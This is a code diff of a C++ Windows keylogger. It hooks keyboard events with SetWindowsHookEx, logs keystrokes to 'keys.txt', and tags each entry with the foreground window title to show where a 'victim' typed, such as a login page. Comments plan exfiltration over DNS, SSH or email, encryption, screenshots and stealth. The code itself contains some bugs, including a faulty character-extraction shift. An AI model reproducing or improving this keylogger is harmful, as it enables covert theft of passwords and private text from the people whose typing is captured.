@@ -3,30 +3,34 @@
  - Better WinAPI reference: https://www.unknowncheats.me/forum/c-and-c/83707-setwindowshookex-example.html
 */
 
+/* Features:
+- Log keys to a file called "keys.txt"
+- Windows API to hook keyboard events
+- Detect when a victim changes windows
+- Write the new window title to the log file, 
+	help to give context to where a victim was typing what (login page vs word document)
+*/
+
 /* NOTES:
-Currently dead simple. Areas for improvement:
- - Less detectable method of hooking user key presses (super high CPU usage with infinite loop right now)
- - We really should be hooking Windows API (SetWindowsHookEx) here instead of making the calls we do
+Currently dead simple. Has some bugs and probably some missing keys in the case table.
+Areas for improvement:
  - Grab screenshot of areas around cursor when clicking
- - Get Window title of where text was typed. Gives context into keys logged
  - Exfiltrate data over DNS, SSH, email, something like that
  - Encrypt data before it is sent out/logged
  - Don't open the file a billion times per second to read/write
- - Use something like this:
+ - Obviously we don't have any kind of stealth in here yet. The victim can see the window open in the background.
+	This is just for testing.
 
- char cWindow[MAX_PATH];
- GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
-
- to get the text of the window being typed in (in cWindow)
+ - Check out other things we can do with wParam
+ https://stackoverflow.com/questions/342167/keyboard-hook-not-getting-lower-or-upper-case-characters
 
 */
 
 #include "stdafx.h"
 #include "public.h"
+// Necessary for our unit tests. We define our own entry point into test cases main method
 #define CATCH_CONFIG_RUNNER
 #include "catch.hpp"
-
-using namespace std;
 
 // Global handle to the keyboard hook
 HHOOK _hook;
@@ -34,10 +38,17 @@ HHOOK _hook;
 // Data structure for the data received by hook
 KBDLLHOOKSTRUCT kbdStruct;
 
+// Previous window title
+char prevWindow[MAX_PATH];
+// Current window title
+char currentWindow[MAX_PATH];
+
 
 int main(int argc, char* argv[])
 {
-
+	// Currently need a better way to integrate tests. Probably in a separate project
+	// in this solution. Unit tests are place holders atm anyway. They all pass because
+	// they just assert 1==1 which always passes
 	// New Catch sessions for running our tests in test.cpp
 	//Catch::Session session; // There must be exactly one instance
 	//int returnCode = session.applyCommandLine(argc, argv);
@@ -53,19 +64,19 @@ int main(int argc, char* argv[])
 
 	//return (numFailed < 0xff ? numFailed : 0xff);
 
+	// Get starting window title, set prevWindow to current window
+	GetWindowTextA(GetForegroundWindow(), currentWindow, sizeof(currentWindow));
+	strcpy(prevWindow, currentWindow);
+
 	// Enable hook
 	SetHook();
+
+	// Use for testing so window stays open
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
 
 	}
-
-	//HWND hwnd = GetConsoleWindow();
-	//AllocConsole();
-	//hwnd = FindWindowA("ConsoleWindowClass", NULL);
-	// Don't show the process window
-	//ShowWindow(hwnd, 0);
 
 }
 // Callback function for kb. Called when a key is pressed
@@ -77,26 +88,10 @@ LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam) {
 			// Dereference into our struct and grab lparam in it.
 			// it's the pointer to the data from the keyboard callback
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-			// Need to add big case table for keypress.
-			// For now we just detect spacebar being pressed
-			Save(kbdStruct.vkCode, "keys.txt");
-			if (kbdStruct.vkCode == VK_SPACE)
-			{
-				// User pressed spacebar, display message box for now.
-				// TODO: write this to a file
-				// char array to store the name of the window in which we captured a key
-				char cWindow[MAX_PATH];
-				// Grab the name of the current window, store it in cWindow
-				GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
-				// Do some Windows black magic to convert char* to LPCWSTR
-				std:wstring widestring;
-				for (int i = 0; i < (int)strlen(cWindow); i++)
-					widestring += (wchar_t)cWindow[i];
-				LPCWSTR str = widestring.c_str();
-
-				// Include the "str" cWindow name in the title field of the message box
-				MessageBox(NULL, _T("Spacebar pressed."), str, MB_ICONINFORMATION);
-			}
+			// char array to store the name of the window in which we captured a key
+			// Grab the name of the current window, store it in cWindow
+			GetWindowTextA(GetForegroundWindow(), currentWindow, sizeof(currentWindow));
+			Save(kbdStruct.vkCode, "keys.txt", currentWindow);
 		}
 	}
 	 
@@ -121,47 +116,67 @@ void ReleaseHook() {
 }
 
 
-
-int Save(DWORD vkCode, char *file)   // Here we define our save function that we declared before.
+// Save takes in a vkCode (see:  https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx) and a pointer to file
+// Then makes decisions on what to do based on what was pressed
+// Here we define our save function that we declared before.
+int Save(DWORD vkCode, char *file, char* cWindow)   
 {
-	if ((key_stroke == 1) || (key_stroke == 2))
-		return 0;
-
+	// Note this is really heavy on file I/O
+	// Need to move this out of here at some point
 	FILE *OUTPUT_FILE;
 	OUTPUT_FILE = fopen(file, "a+");
 
-	cout << key_stroke << endl;
-
-	if (key_stroke == 8)  // The numbers stands for the ascii value of a character
-		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");  // This will print [BACKSPACE] when key 8 is pressed. All the code under this works the same.
-	else if (key_stroke == 13)
-		fprintf(OUTPUT_FILE, "%s", "\n"); // This will make a newline when the enter key is pressed.
-	else if (key_stroke == 32)
-		fprintf(OUTPUT_FILE, "%s", " ");
-	else if (key_stroke == VK_TAB)              //VK stands for virtual key wich are the keys like Up arrow, down arrow..
+	// If the user switched tabs (window title)
+	if (strcmp(prevWindow, currentWindow) != 0) {
+		// Set that to be the new last known window, then write the change to the keylogger
+		strcpy(prevWindow, currentWindow);
+		fprintf(OUTPUT_FILE, "\r\nChanged Window: \t%s\r\n", currentWindow);
+	}
+	
+	if (vkCode == VK_LBUTTON)
+		// TODO: Grab screen grab around current cursor 
+		// grab current mouse position
+		// take screencap of 512x512 centered around mouse pos
+		fprintf(OUTPUT_FILE, "%s", "[LMB]");
+	else if (vkCode == VK_BACK)
+		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
+	else if (vkCode == VK_TAB)
 		fprintf(OUTPUT_FILE, "%s", "[TAB]");
-	else if (key_stroke == VK_SHIFT)
+	else if (vkCode == VK_SHIFT)
 		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
-	else if (key_stroke == VK_CONTROL)
+	else if (vkCode == VK_CONTROL)
 		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
-	else if (key_stroke == VK_ESCAPE)
+	else if (vkCode == VK_ESCAPE)
 		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
-	else if (key_stroke == VK_END)
+	else if (vkCode == VK_END)
 		fprintf(OUTPUT_FILE, "%s", "[END]");
-	else if (key_stroke == VK_HOME)
+	else if (vkCode == VK_HOME)
 		fprintf(OUTPUT_FILE, "%s", "[HOME]");
-	else if (key_stroke == VK_LEFT)
+	else if (vkCode == VK_LEFT)
 		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
-	else if (key_stroke == VK_UP)
+	else if (vkCode == VK_UP)
 		fprintf(OUTPUT_FILE, "%s", "[UP]");
-	else if (key_stroke == VK_RIGHT)
+	else if (vkCode == VK_RIGHT)
 		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
-	else if (key_stroke == VK_DOWN)
+	else if (vkCode == VK_DOWN)
 		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
-	else if (key_stroke == 190 || key_stroke == 110)
+	else if (vkCode == VK_RETURN)
+		// Carriage return line feed when enter is pressed
+		fprintf(OUTPUT_FILE, "%s", "\r\n");
+	else if (vkCode == VK_OEM_PERIOD)
 		fprintf(OUTPUT_FILE, "%s", ".");
-	else
-		fprintf(OUTPUT_FILE, "%s", &key_stroke);
+	else if (vkCode == VK_CONTROL)
+		fprintf(OUTPUT_FILE, "%s", "[CTRL]");
+	else if (vkCode == VK_MENU)
+		fprintf(OUTPUT_FILE, "%s", "[ALT]");
+	// TODO: Detect whether shift/caps lock is currently pressed so we can
+	// tell the difference between upper and lower case letters in our log file
+	else if (vkCode >= 0x41 && vkCode <= 0x5A) {
+		// Some wizardry here:
+		// Grab the last byte from the DWORD: shift right and mask it with 0xff
+		// This contains our ASCII char code for the key press 0x41(65) = A 0x5A(90) = Z
+		fprintf(OUTPUT_FILE, "%c", (char)((vkCode >> (8 * 4)) & 0xff));
+	}
 
 	fclose(OUTPUT_FILE);
 	return 0;
